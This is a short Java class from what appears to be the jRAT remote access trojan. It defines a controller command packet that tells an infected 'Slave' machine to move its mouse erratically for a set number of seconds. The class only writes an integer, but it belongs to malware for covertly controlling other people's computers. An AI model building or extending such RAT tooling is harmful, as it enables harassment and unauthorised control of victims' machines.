package jrat.controller.packets.outgoing;

import jrat.controller.Slave;
import java.io.DataOutputStream;


public class Packet46CrazyMouse extends AbstractOutgoingPacket {

	private int seconds;

	public Packet46CrazyMouse(int seconds) {
		this.seconds = seconds;
	}

	@Override
	public void write(Slave slave, DataOutputStream dos) throws Exception {
		dos.writeInt(seconds);
	}

	@Override
	public short getPacketId() {
		return 46;
	}

}
